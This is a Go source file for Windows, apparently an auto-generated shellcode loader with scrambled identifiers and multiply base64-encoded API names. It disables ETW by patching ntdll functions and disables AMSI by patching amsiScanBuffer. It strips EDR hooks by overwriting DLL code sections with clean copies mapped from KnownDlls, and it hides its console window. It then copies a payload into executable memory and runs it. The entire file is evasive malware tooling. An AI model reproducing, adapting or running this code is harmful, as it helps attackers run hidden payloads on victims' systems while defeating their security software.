
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"mJGwlBUTRWjIwan/mJGwlBUTRWjIwan"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		EgfVRCc= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		nDnwgQJ uint16
		HkYed uint16
		bDkJ int = 5
	)

	
	
	
	
	func StqyouPh() string {
		YSAGi, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		JiuSujB, _, _ :=  YSAGi.GetStringValue("CurrentVersion")
		xaKkYM, _, err := YSAGi.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//NjAJvdKI, _, _ := YSAGi.GetIntegerValue("CurrentMinorVersionNumber")
			JiuSujB = strconv.FormatUint(xaKkYM, 10)
		}
		defer YSAGi.Close()
		if JiuSujB == "10" {
			nDnwgQJ = 0x18
			HkYed = 0x50
		} else if JiuSujB == "6.3" {
			nDnwgQJ = 0x17
			HkYed = 0x4f
		} else if JiuSujB == "6.2" {
			nDnwgQJ = 0x16
			HkYed = 0x4e
		} else if JiuSujB == "6.1" {
			nDnwgQJ = 0x15
			HkYed= 0x4d
		}
		return JiuSujB 

	}

	func ObtL(VnCrZ string,) string {
		var XhABQf []byte
			XhABQf, _ = base64.StdEncoding.DecodeString(VnCrZ)
		EFKJTsez := 1
		for i := 1; i < bDkJ; i++ {
			XhABQf, _ = base64.StdEncoding.DecodeString(string(XhABQf))
			EFKJTsez += i
		}
		return string(XhABQf)
	
	}

	

	func xFOUMySyyqrDJiAzy(show bool) {
		OWDvBZKritLCwjCLk := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(ObtL("Vmxkd1MxWXdNVWRTV0d4UVYwWmFjVlJYY0hObGJHUnpWMjEwYWxJd2NEQldWelZoWVRKU05rMUVhejA9"))
		AziMTkqQGrCnCMmA := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(ObtL("Vm14U1MySXlVblJWV0doaFUwVktjRmxzV2t0TmJIQkpXWHBzVVZWVU1Eaz0="))
		ydPWzxvnvJw, _, _ := OWDvBZKritLCwjCLk.Call()
		if ydPWzxvnvJw == 0 {
			return
		}
		if show {
		var LTBESWpjtyJAcKEXg uintptr = 9
		AziMTkqQGrCnCMmA.Call(ydPWzxvnvJw, LTBESWpjtyJAcKEXg)
		} else {
		var CtPIlKosnzYwqLLTu uintptr = 0
		AziMTkqQGrCnCMmA.Call(ydPWzxvnvJw, CtPIlKosnzYwqLLTu)
		}
	}



	
	const (
		jzOubIJe= 997
	)
	var EgXAK error = syscall.Errno(jzOubIJe)
	var zQVUtSs = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(ObtL("Vm0xd1QxTXlUa2hWYTJoWFlrVmFjVmxzVW5OalZtUnpZVVU1YkdKR1NsbFdiVFZUWVZVd2QySjZSVDA9"))


	func wkpQS(CqsIg uintptr, ZEEust uintptr, BVCSbk *byte, DrmkKyo uintptr, gWicaE *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(zQVUtSs.Addr(), 5, uintptr(CqsIg), uintptr(ZEEust), uintptr(unsafe.Pointer(BVCSbk)), uintptr(DrmkKyo), uintptr(unsafe.Pointer(gWicaE)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = eYIJG(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func eYIJG(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case jzOubIJe:
			return EgXAK
		}
	
		return e
	}
	

	
	var kBCKI = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(ObtL("VmxkNGIxVXdNSGhWYmxKUVZrVktiMVpxUm5ka01XUlZVMnRrVGxJd1dsbFVNV2hYVm0xS1YxZHVWbHBXYldoUVZGVmFkMWRXVGxWTlJEQTk="))
	var ORdLp = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(ObtL("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0V1JtUnpXa2QwYWxJd01UWldWekUwWVd4d05rMUVhejA9"))
	var UXfBY = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(ObtL("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsZFdNbkJIWVZaSmVsbDZhejA9"))
	var UevVfoB = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(ObtL("VmxkNGIxVXdNSGhUYkd4WVlsaG9jRmx0ZUV0WFZtdDVUVmhPVGxKdVFsTlZSbEYzVUZFOVBRPT0="))

	func NaTTLdOV() {
		MyjmXB := uintptr(0xffffffffffffffff)
		FvHl := []uintptr{ kBCKI.Addr(), ORdLp.Addr(), UXfBY.Addr(), UevVfoB.Addr()}
		for i, _ := range FvHl {
			plwAi, _ := hex.DecodeString("4833C0C3")
			var XliYOL uintptr
			sgiqtxzt := len(plwAi)
			wkpQS(MyjmXB, FvHl[i], &plwAi[0], uintptr(uint32(sgiqtxzt)), &XliYOL)
		}
	}

	func DOGzM(MyjmXB windows.Handle) {
		FvHl := []uintptr{ kBCKI.Addr(), ORdLp.Addr(), UXfBY.Addr(), UevVfoB.Addr()}
		for i, _ := range FvHl {
			plwAi, _ := hex.DecodeString("4833C0C3")
			var XliYOL uintptr
			sgiqtxzt := len(plwAi)
			wkpQS(uintptr(MyjmXB), FvHl[i], &plwAi[0], uintptr(uint32(sgiqtxzt)), &XliYOL)
		}
	}



	
	func bLTWF() {
		var VUQOqAj uint64
		VUQOqAj = 0xffffffffffffffff
		HkAgWKj, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		FqgAp, _ := windows.GetProcAddress(HkAgWKj, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		neewm, _ :=  hex.DecodeString("B857000780C3")
		var nLsXfSHK uintptr
		BHoFN := len(neewm)
		wkpQS(uintptr(VUQOqAj), uintptr(uint(FqgAp)), &neewm[0], uintptr(uint32(BHoFN)), &nLsXfSHK)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func Fqjvxvi() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		NaTTLdOV()
		bLTWF()
		time.Sleep(2629 * time.Millisecond)
		JiuSujB := StqyouPh()
		
		if JiuSujB == "10" {
			DpFNiGkkJJwnBAdra()
		}
		NaTTLdOV()
		xFOUMySyyqrDJiAzy(false)
		dLsMdEMXlejTomwIR := mJGwlBUTRWjIwan.RathTjoWHJAXdDPFP()
		GjyYGrEYXmMmauTmM(dLsMdEMXlejTomwIR)
	}

	
	func GjyYGrEYXmMmauTmM(dLsMdEMXlejTomwIR []byte){
		QPnFQJVTKWzUSGIjH := windows.NewLazySystemDLL("ntdll.dll")
		NawUbPIUXVVlRqQ := windows.NewLazySystemDLL("kernel32")
		BbqfFkPsEn := QPnFQJVTKWzUSGIjH.NewProc("RtlCopyMemory")
		zaLaBDeGGl := NawUbPIUXVVlRqQ.NewProc("VirtualAlloc")

		var vwZxuheDJREv, FeFkwLziUSgCYs uintptr
		var DzALYvRrKsGdmx uintptr
		qbEVmgtcAL := uintptr(0xffffffffffffffff)
		OQQQoXGgRrVljswNTL := uintptr(len(dLsMdEMXlejTomwIR))
		FeFkwLziUSgCYs = 0x40
		vwZxuheDJREv = 0x3000
		TYctDftxVcAGPu, _, _ := zaLaBDeGGl.Call(0, uintptr(len(dLsMdEMXlejTomwIR)), vwZxuheDJREv, FeFkwLziUSgCYs)

		
		BbqfFkPsEn.Call(TYctDftxVcAGPu, (uintptr)(unsafe.Pointer(&dLsMdEMXlejTomwIR[0])), uintptr(len(dLsMdEMXlejTomwIR)))
		
		


		mJGwlBUTRWjIwan.HWRtTbqjwatte(
			HkYed, 
			qbEVmgtcAL,
			(*uintptr)(unsafe.Pointer(&TYctDftxVcAGPu)),
			&OQQQoXGgRrVljswNTL,
			0x20,
			&DzALYvRrKsGdmx,
			)
		
		syscall.Syscall(TYctDftxVcAGPu, 0, 0, 0, 0)
	}


	
	
		var zTHwZEwwXiJh      uint16
		var uNeRjErSGfeMtIoi uint16
		var YHNIiqXuFTRDgyu      uint16
		func DpFNiGkkJJwnBAdra()  {
			PojdZdTWtzQoGoJB := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range PojdZdTWtzQoGoJB {
			KnownDLL(PojdZdTWtzQoGoJB[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(rFxoQLZvJscuphr  string) []byte {
			
			var kZirKHMVXVneGlbcmH , avREwqpnOAZrlkmRjT , gtRFvMoxRErSI  uintptr
			UDEfcNvmijp := uintptr(0xffffffffffffffff)
			PSXzjJHcjyhxRCUMD := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + rFxoQLZvJscuphr 
			JGtJoNqyXXMkO, _ := windows.NewNTUnicodeString(PSXzjJHcjyhxRCUMD)
			FYDziDhHsQRD := windows.OBJECT_ATTRIBUTES{}
			FYDziDhHsQRD.Attributes = 0x00000040
			FYDziDhHsQRD.ObjectName = JGtJoNqyXXMkO
			FYDziDhHsQRD.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			sHGKqqbczdvnhmbTUW := Fqjvxvi()
			zTHwZEwwXiJh = 0x37
			FiaZhemAeTvRYZe := 0x0004
			r, _ := mJGwlBUTRWjIwan.VVFGrScnXQVwKxh(
				zTHwZEwwXiJh, 
				sHGKqqbczdvnhmbTUW, 
				uintptr(unsafe.Pointer(&kZirKHMVXVneGlbcmH)), 
				uintptr(FiaZhemAeTvRYZe), 
				uintptr(unsafe.Pointer(&FYDziDhHsQRD)),
			)
			if r != 0 {
			}
			uNeRjErSGfeMtIoi = 0x28
			zero := 0
			one := 1
			mJGwlBUTRWjIwan.XeGrzGJGgGds(
				uNeRjErSGfeMtIoi, 
				sHGKqqbczdvnhmbTUW, 
				kZirKHMVXVneGlbcmH, 
				UDEfcNvmijp, 
				uintptr(unsafe.Pointer(&gtRFvMoxRErSI)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&avREwqpnOAZrlkmRjT)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			QUHJlNDnPVMCf := rawreader.New(gtRFvMoxRErSI, int(avREwqpnOAZrlkmRjT))
			TfqRleZRVQjdUqnpMh, _ := pe.NewFileFromMemory(QUHJlNDnPVMCf)
			asSvphiTZgiWi, err := TfqRleZRVQjdUqnpMh.Bytes()
			if err != nil {
			}
			RrOkzaWBFMUAeBNK := TfqRleZRVQjdUqnpMh.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			WyEsQLdpCzxz := asSvphiTZgiWi[RrOkzaWBFMUAeBNK.Offset:RrOkzaWBFMUAeBNK.Size]
			anZdGXLJnTaTy, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  rFxoQLZvJscuphr )
			if error != nil {
			}
			svrlAvgHoUrozN := anZdGXLJnTaTy.Section(".text")
			bVlwzKpYWmOICuKL, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  rFxoQLZvJscuphr )
			if error != nil {
			}
			LhIYaDBcup := bVlwzKpYWmOICuKL.Handle
			WrPakmEzMcjmTvtYdF  := uintptr(LhIYaDBcup)
			bvNynlruKCvbQRdJ := uint(WrPakmEzMcjmTvtYdF) + uint(svrlAvgHoUrozN.VirtualAddress)
			YHNIiqXuFTRDgyu = 0x50
			FzHvrlDTEWKEgd := uintptr(len(WyEsQLdpCzxz))
			var zWBzrjLBNyrsAkN uintptr

			TQuYCDOkKPvyYfcpvX, _ := mJGwlBUTRWjIwan.TgFqteeucrUQ(
				YHNIiqXuFTRDgyu, 
				sHGKqqbczdvnhmbTUW, 
				UDEfcNvmijp, 
				(*uintptr)(unsafe.Pointer(&bvNynlruKCvbQRdJ)), 
				&FzHvrlDTEWKEgd, 
				0x40, 
				&zWBzrjLBNyrsAkN,
			)
			if TQuYCDOkKPvyYfcpvX != 0 {
			}
			dLuJYglZhaZNsDl(WyEsQLdpCzxz, uintptr(bvNynlruKCvbQRdJ))
			anZdGXLJnTaTy.Close()
			TQuYCDOkKPvyYfcpvX, _ = mJGwlBUTRWjIwan.TgFqteeucrUQ(
				YHNIiqXuFTRDgyu, 
				sHGKqqbczdvnhmbTUW, 
				UDEfcNvmijp, 
				(*uintptr)(unsafe.Pointer(&bvNynlruKCvbQRdJ)), 
				&FzHvrlDTEWKEgd, 
				0x20, 
				&zWBzrjLBNyrsAkN,
			)
			if TQuYCDOkKPvyYfcpvX != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(UDEfcNvmijp), gtRFvMoxRErSI, 0)
			return WyEsQLdpCzxz
		}


		func dLuJYglZhaZNsDl(KqdxuJDMSFDMTvGtnZ []byte, YDIYvdXmumgUMwr uintptr) {
			for fafEMCHsbf := uint32(0); fafEMCHsbf < uint32(len(KqdxuJDMSFDMTvGtnZ)); fafEMCHsbf++ {
				ZtEfoxAQkJNRRfBG := unsafe.Pointer(YDIYvdXmumgUMwr + uintptr(fafEMCHsbf))
				YzaqNrvCka := (*byte)(ZtEfoxAQkJNRRfBG)
				*YzaqNrvCka = KqdxuJDMSFDMTvGtnZ[fafEMCHsbf]
			}
		}

	
